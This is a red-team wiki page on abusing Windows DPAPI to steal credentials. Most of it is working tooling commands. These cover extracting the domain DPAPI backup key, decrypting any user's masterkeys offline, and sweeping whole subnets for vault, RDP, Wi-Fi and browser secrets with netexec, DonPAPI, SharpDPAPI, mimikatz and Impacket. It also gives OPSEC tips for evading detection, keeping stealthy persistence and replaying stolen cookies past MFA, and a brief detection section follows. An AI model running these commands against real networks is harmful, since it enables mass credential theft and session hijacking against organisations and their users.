---
title: "DPAPI abuse (masterkeys, browser creds, the domain backup key)"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [credential-access, dpapi, browser-creds, persistence, opsec]
---

# DPAPI abuse

The **Data Protection API (DPAPI)** is how Windows encrypts a user's local
secrets "at rest": saved **browser passwords and cookies** (Chrome/Edge/Firefox),
**Credential Manager / Windows Vault**, **RDP saved creds** (`.rdg`), **Wi-Fi
PSKs**, scheduled-task and service passwords, and app secrets. Every one of those
blobs is a decryptable credential *if you can reach the masterkey* — which makes
DPAPI one of the highest-yield credential-access surfaces on a foothold, and the
thing `--dpapi` in [[netexec]] and `sekurlsa::dpapi` in [[mimikatz]] are pulling.
It's the detail behind the one-line "DPAPI" row in [[credential-dumping]] /
[[lsass]] — this is the full mechanism.

## How DPAPI protects a blob (why the masterkey is the target)

- A user's secrets are encrypted with a **DPAPI masterkey** (per-user, one or
  more, identified by GUID). Files live in
  `%APPDATA%\Microsoft\Protect\<SID>\<masterkey-GUID>`.
- The **masterkey itself** is encrypted with a key **derived from the user's
  password** (their NT hash / SHA1). So: *user password → masterkey → the blob*.
- Each encrypted blob (a "DPAPI blob") records **which masterkey GUID** it needs.
  Decrypt = find the referenced masterkey, decrypt the masterkey, decrypt the blob.
- The system also has **machine masterkeys** (protected by the machine key /
  LSA secrets) for `SYSTEM`-context secrets like scheduled-task creds and
  wireless profiles.

There are **three ways to get the masterkey**, in rough order of OPSEC:

1. **From the user's password/NT hash** (offline) — you hold the cred, derive the
   masterkey key, decrypt the masterkey file, decrypt the blobs. No LSASS touch.
2. **From LSASS memory** — an already-unlocked session has decrypted masterkeys
   cached; `sekurlsa::dpapi` / `--dpapi` scrape them. Needs local admin + an
   LSASS read ([[lsass]]) — noisier (Sysmon 10).
3. **From the domain DPAPI backup key** — the big one, below.

## The domain DPAPI backup key (the mass-decrypt / persistence primitive)

Every domain has a single **RSA "backup key"** stored on the DCs. When a domain
user's masterkey is created, a copy is also encrypted to this backup key so the
domain can recover the user's secrets if they reset their password. Consequence
for an attacker with **Domain Admin (or DC access)**:

- **Extract the backup key once**, and you can **decrypt the DPAPI masterkeys —
  and therefore every DPAPI secret — of *any* user in the domain, offline,
  forever**, without their password and without touching a DC again.
- It's both a **mass credential-harvesting** shortcut and a **stealth
  persistence** primitive: the key doesn't rotate on user password changes.

```bash
# Extract the domain backup key (needs DA / DC access) — pick one:
#   mimikatz:
lsadump::backupkeys /system:dc01.corp.local /export     # writes ntds_*.pvk
#   Impacket (remote):
dpapi.py backupkeys -t corp.local/DA:'Pass'@dc01 --export   # -> key.pvk
#   SharpDPAPI (on-host):
SharpDPAPI.exe backupkey /server:dc01.corp.local /file:key.pvk

# Then decrypt ANY user's masterkey with that .pvk, offline:
dpapi.py masterkey -file "<masterkey-GUID>" -pvk key.pvk
mimikatz # dpapi::masterkey /in:<masterkey> /pvk:key.pvk
```

## Hands-on: harvesting DPAPI secrets

```bash
# Remote, automated, from the Linux operator host (needs local admin on targets):
nxc smb 10.0.0.0/24 -u adm -p pass --dpapi            # masterkeys + creds/vault/RDP/wifi
nxc smb 10.0.0.0/24 -u adm -p pass --dpapi cookies    # also browser cookies (session theft)
# DonPAPI does the whole loop at scale (masterkeys + all blobs, results DB):
DonPAPI.py corp.local/adm:pass@10.0.0.0/24

# On-host (GhostPack SharpDPAPI):
SharpDPAPI.exe triage            # find + decrypt everything for the current user
SharpDPAPI.exe masterkeys /pvk:key.pvk   # decrypt all masterkeys with the domain key
SharpDPAPI.exe rdg               # decrypt saved RDP/RDG creds

# mimikatz (from an unlocked session, no cred needed — pulls decrypted keys from LSASS):
sekurlsa::dpapi                  # cached masterkeys from memory
dpapi::cred /in:"%APPDATA%\Microsoft\Credentials\<GUID>"

# Impacket, blob by blob with a known masterkey:
dpapi.py credential -file "<cred-blob>" -key <decrypted-masterkey>
dpapi.py chrome     -file "Login Data" -key <masterkey>    # browser logins
```

**Cookies are a credential.** Stolen browser cookies replay an authenticated web
session **past MFA** — for M365/Okta/internal apps this is often faster than
cracking a password. `--dpapi cookies` / SharpChrome are the pull.

## Red-team notes (OPSEC)

- **Prefer the offline masterkey path over dumping LSASS.** If you already hold
  the user's password/NT hash, decrypting their masterkey files touches
  `%APPDATA%\...\Protect\` and never opens `lsass.exe` — much lower signal than a
  minidump ([[credential-dumping]]). Reserve `sekurlsa::dpapi` for when you have
  a live session and no cred.
- **The backup key is a quiet domain-persistence stash.** Grab it during your DA
  window; afterward you decrypt new users' secrets offline with zero DC contact —
  it survives their password resets. Treat it like the DPAPI equivalent of the
  krbtgt hash for credential recovery.
- **DonPAPI / `--dpapi` across a /24 is loud** (SMB + remote file reads on every
  host). Scope it to workstations that matter (developers, admins, jump hosts)
  rather than the whole estate.
- **Chase cookies for MFA'd apps**; chase Credential Manager/RDP for lateral creds
  to the next host; chase Wi-Fi/scheduled-task blobs for service accounts.

## Detection

- **File access** to `%APPDATA%\Microsoft\Protect\*` and
  `...\Credentials\*` / browser `Login Data` + `Cookies` by a non-owner process.
- **LSASS access** (Sysmon **10**) for the `sekurlsa::dpapi` path.
- **Backup-key extraction**: `LsaRetrievePrivateData` / `BackupKey` RPC to the DC
  (`\\pipe\lsarpc`, `G$BCKUPKEY_*` secrets) — a rare, high-fidelity DA-level event.
- **SMB/remote-file fan-out** from one source reading Protect/Credentials dirs on
  many hosts = DonPAPI/`--dpapi` sweep.
- Mitigations: **Credential Guard** (isolates some secrets), avoiding saved
  browser/RDP creds, and monitoring the backup-key RPC.

## Links

- [[credential-dumping]] — the parent map; DPAPI is one row, this is the depth
- [[lsass]] — the memory path (`sekurlsa::dpapi`) and where masterkeys cache
- [[mimikatz]] / [[netexec]] — `dpapi::*` / `--dpapi` tooling
- [[sccm-abuse]] — SCCM NAA and other secrets often land in DPAPI stores
- [[dcsync]] — the other "own the DC → own every secret" primitive (backup key is the DPAPI analogue)
- [[pass-the-hash-and-ticket]] — the NT hash that derives a user's masterkey
- [[credential-dumping]] / [[defense-evasion-ad]] — quiet vs loud extraction

## References

- [SharpDPAPI (GhostPack)](https://github.com/GhostPack/SharpDPAPI)
- [DonPAPI](https://github.com/login-securite/DonPAPI)
- [Impacket dpapi.py](https://github.com/fortra/impacket)
